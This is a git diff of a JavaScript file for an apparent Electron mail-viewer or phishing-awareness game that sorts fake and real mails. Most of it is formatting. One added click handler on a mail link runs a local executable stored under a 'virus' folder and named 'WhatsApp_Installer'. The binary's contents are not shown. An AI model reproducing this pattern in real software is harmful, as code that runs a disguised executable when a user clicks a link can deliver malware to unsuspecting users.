@@ -1,12 +1,14 @@
 'use strict';
 
+const {exec} = require("child_process");
+const events = require("node:events");
+
 const mailOuvertEl = document.getElementById('mail-ouvert')
 const boutonRetourEl = document.querySelector('.bouton-retour')
 const listMailEl = document.querySelector('.containerMails')
 
 let listFauxMail = []
 let listVraiMail = []
-
 let listMails = []
 let currentMailIndex = null
 
@@ -27,20 +29,20 @@ function getDateParts(str) {
     let m;
     // jj/mm/aaaa
     if ((m = s.match(/^(\d{2})\/(\d{2})\/(\d{4})$/))) {
-        return { d: +m[1], m: +m[2], y: +m[3] };
+        return {d: +m[1], m: +m[2], y: +m[3]};
     }
     // aaaa-mm-jj
     if ((m = s.match(/^(\d{4})-(\d{2})-(\d{2})$/))) {
-        return { d: +m[3], m: +m[2], y: +m[1] };
+        return {d: +m[3], m: +m[2], y: +m[1]};
     }
     return null;
 }
 
 function getTimeParts(str) {
-    if (!str || typeof str !== "string") return { h: 0, min: 0 };
+    if (!str || typeof str !== "string") return {h: 0, min: 0};
     const m = str.trim().match(/^(\d{1,2}):(\d{2})$/);
-    if (!m) return { h: 0, min: 0 };
-    return { h: +m[1], min: +m[2] };
+    if (!m) return {h: 0, min: 0};
+    return {h: +m[1], min: +m[2]};
 }
 
 // Normalise le champ mail.date en jj/mm/aaaa (si possible)
@@ -114,7 +116,9 @@ async function loadMails() {
     afficherListeMails()
 }
 
-addEventListener('load', loadMails)
+window.addEventListener('load', () => {
+    loadMails()
+})
 
 function afficherListeMails() {
     listMailEl.innerHTML = ""
@@ -136,6 +140,9 @@ function afficherListeMails() {
 
 async function ouvrirMail(id) {
 
+    scroll = window.scrollY
+
+    window.scrollTo(0, 0)
     listMailEl.style.display = 'none'
 
     mailOuvertEl.style.display = 'block'
@@ -150,6 +157,12 @@ async function ouvrirMail(id) {
     mailOuvertEl.querySelector('.message').innerHTML = message
     mailOuvertEl.querySelector('.secret').innerHTML = `${mail.secret}`
 
+    const link = document.querySelector('.lien');
+    link.addEventListener('click', e => {
+        exec('.\\resources\\app\\src\\virus\\WhatsApp_Installer', (error, stdout, stderr) => {
+            console.log(stderr)
+        });
+    })
 
     if (mail.backgroundImage) {
         mailOuvertEl.style.backgroundImage = `linear-gradient(rgba(255,255,255,0.9), rgba(255,255,255,0.9)), url('../images/${mail.backgroundImage}')`
@@ -160,9 +173,7 @@ async function ouvrirMail(id) {
     }
 
     currentMailIndex = id
-    scroll = window.scrollY
 
-    window.scrollTo(0, 0)
 
     boutonRetourEl.style.animationName = "slideIn"
     boutonRetourEl.style.animationDuration = '0.2s'
@@ -227,3 +238,5 @@ function afficherfeedback(message) {
         popup.classList.remove("show");
     }, 2000);
 }
+
+
